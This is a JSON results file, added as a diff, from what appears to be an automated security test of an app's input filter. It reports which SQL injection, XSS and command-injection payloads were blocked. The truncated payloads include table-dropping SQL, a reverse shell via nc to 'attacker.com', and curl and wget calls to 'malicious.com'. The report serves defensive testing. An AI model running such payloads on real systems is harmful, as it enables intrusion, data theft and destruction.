@@ -1,0 +1,227 @@
+{
+  "summary": {
+    "total_tests": 33,
+    "passed_tests": 24,
+    "failed_tests": 9,
+    "success_rate": 72.72727272727273,
+    "security_score": 40.0,
+    "timestamp": "2025-09-10T18:52:46.744331",
+    "critical_validations": {
+      "sql_injection_blocked": false,
+      "xss_attacks_blocked": true,
+      "command_injection_blocked": false,
+      "legitimate_requests_allowed": false,
+      "core_systems_operational": true
+    }
+  },
+  "detailed_results": {
+    "SQL_INJECTION": [
+      {
+        "test": "SQL Injection Payload 1",
+        "success": true,
+        "details": "Blocked: '; DROP TABLE notes; --...",
+        "timestamp": "2025-09-10T18:52:46.565429"
+      },
+      {
+        "test": "SQL Injection Payload 2",
+        "success": false,
+        "details": "NOT BLOCKED: ' OR '1'='1...",
+        "timestamp": "2025-09-10T18:52:46.569253"
+      },
+      {
+        "test": "SQL Injection Payload 3",
+        "success": true,
+        "details": "Blocked: '; DELETE FROM users; --...",
+        "timestamp": "2025-09-10T18:52:46.571179"
+      },
+      {
+        "test": "SQL Injection Payload 4",
+        "success": true,
+        "details": "Blocked: ' UNION SELECT * FROM admin; -...",
+        "timestamp": "2025-09-10T18:52:46.573033"
+      },
+      {
+        "test": "SQL Injection Payload 5",
+        "success": false,
+        "details": "NOT BLOCKED: ; DROP DATABASE test_database;...",
+        "timestamp": "2025-09-10T18:52:46.576496"
+      },
+      {
+        "test": "SQL Injection Payload 6",
+        "success": false,
+        "details": "NOT BLOCKED: ' OR 1=1 --...",
+        "timestamp": "2025-09-10T18:52:46.579660"
+      },
+      {
+        "test": "SQL Injection Payload 7",
+        "success": true,
+        "details": "Blocked: '; INSERT INTO notes VALUES ('...",
+        "timestamp": "2025-09-10T18:52:46.581485"
+      },
+      {
+        "test": "SQL Injection Defense Overall",
+        "success": false,
+        "details": "Only 4/7 blocked (57.1%)",
+        "timestamp": "2025-09-10T18:52:46.581509"
+      }
+    ],
+    "XSS_ATTACKS": [
+      {
+        "test": "XSS Payload 1",
+        "success": true,
+        "details": "Blocked: <script>alert('xss')</script>...",
+        "timestamp": "2025-09-10T18:52:46.583416"
+      },
+      {
+        "test": "XSS Payload 2",
+        "success": true,
+        "details": "Blocked: <img src=x onerror=alert('xss'...",
+        "timestamp": "2025-09-10T18:52:46.585107"
+      },
+      {
+        "test": "XSS Payload 3",
+        "success": true,
+        "details": "Blocked: javascript:alert('xss')...",
+        "timestamp": "2025-09-10T18:52:46.586762"
+      },
+      {
+        "test": "XSS Payload 4",
+        "success": true,
+        "details": "Blocked: <svg onload=alert('xss')>...",
+        "timestamp": "2025-09-10T18:52:46.588399"
+      },
+      {
+        "test": "XSS Payload 5",
+        "success": true,
+        "details": "Blocked: <iframe src=javascript:alert('...",
+        "timestamp": "2025-09-10T18:52:46.590077"
+      },
+      {
+        "test": "XSS Payload 6",
+        "success": true,
+        "details": "Blocked: <body onload=alert('xss')>...",
+        "timestamp": "2025-09-10T18:52:46.591770"
+      },
+      {
+        "test": "XSS Payload 7",
+        "success": true,
+        "details": "Blocked: <script>document.cookie='hacke...",
+        "timestamp": "2025-09-10T18:52:46.593438"
+      },
+      {
+        "test": "XSS Defense Overall",
+        "success": true,
+        "details": "7/7 blocked (100.0%)",
+        "timestamp": "2025-09-10T18:52:46.593470"
+      }
+    ],
+    "COMMAND_INJECTION": [
+      {
+        "test": "Command Injection Payload 1",
+        "success": true,
+        "details": "Blocked: ; rm -rf /...",
+        "timestamp": "2025-09-10T18:52:46.595138"
+      },
+      {
+        "test": "Command Injection Payload 2",
+        "success": true,
+        "details": "Blocked: | cat /etc/passwd...",
+        "timestamp": "2025-09-10T18:52:46.596785"
+      },
+      {
+        "test": "Command Injection Payload 3",
+        "success": true,
+        "details": "Blocked: && wget malicious.com/script.s...",
+        "timestamp": "2025-09-10T18:52:46.598440"
+      },
+      {
+        "test": "Command Injection Payload 4",
+        "success": false,
+        "details": "NOT BLOCKED: ; curl -X POST malicious.com/d...",
+        "timestamp": "2025-09-10T18:52:46.601824"
+      },
+      {
+        "test": "Command Injection Payload 5",
+        "success": true,
+        "details": "Blocked: | nc -e /bin/sh attacker.com 4...",
+        "timestamp": "2025-09-10T18:52:46.603490"
+      },
+      {
+        "test": "Command Injection Payload 6",
+        "success": false,
+        "details": "NOT BLOCKED: ; python -c 'import os; os.sys...",
+        "timestamp": "2025-09-10T18:52:46.606538"
+      },
+      {
+        "test": "Command Injection Payload 7",
+        "success": false,
+        "details": "NOT BLOCKED: && echo 'hacked' > /tmp/hacked...",
+        "timestamp": "2025-09-10T18:52:46.609476"
+      },
+      {
+        "test": "Command Injection Defense Overall",
+        "success": false,
+        "details": "Only 4/7 blocked (57.1%)",
+        "timestamp": "2025-09-10T18:52:46.609505"
+      }
+    ],
+    "LEGITIMATE_REQUESTS": [
+      {
+        "test": "Legitimate Note Creation",
+        "success": false,
+        "details": "HTTP 429",
+        "timestamp": "2025-09-10T18:52:46.612763"
+      },
+      {
+        "test": "Legitimate Envelope Send",
+        "success": true,
+        "details": "Envelope sent: db2eb0d1...",
+        "timestamp": "2025-09-10T18:52:46.615901"
+      },
+      {
+        "test": "Basic API Connectivity",
+        "success": true,
+        "details": "Root endpoint responding correctly",
+        "timestamp": "2025-09-10T18:52:46.618468"
+      }
+    ],
+    "CORE_SYSTEMS": [
+      {
+        "test": "STEELOS-Shredder System",
+        "success": true,
+        "details": "CYANIDE TABLET deployment working",
+        "timestamp": "2025-09-10T18:52:46.621757"
+      },
+      {
+        "test": "PIN Security System",
+        "success": true,
+        "details": "PIN verification working",
+        "timestamp": "2025-09-10T18:52:46.730234"
+      },
+      {
+        "test": "Contact Vault System",
+        "success": true,
+        "details": "Contact vault storage working",
+        "timestamp": "2025-09-10T18:52:46.735296"
+      },
+      {
+        "test": "Auto-Wipe System",
+        "success": true,
+        "details": "Auto-wipe configuration working",
+        "timestamp": "2025-09-10T18:52:46.739548"
+      },
+      {
+        "test": "Admin Authentication System",
+        "success": true,
+        "details": "Admin authentication working",
+        "timestamp": "2025-09-10T18:52:46.744076"
+      },
+      {
+        "test": "All Core Security Systems",
+        "success": true,
+        "details": "5/5 systems operational (100.0%)",
+        "timestamp": "2025-09-10T18:52:46.744093"
+      }
+    ]
+  }
+}
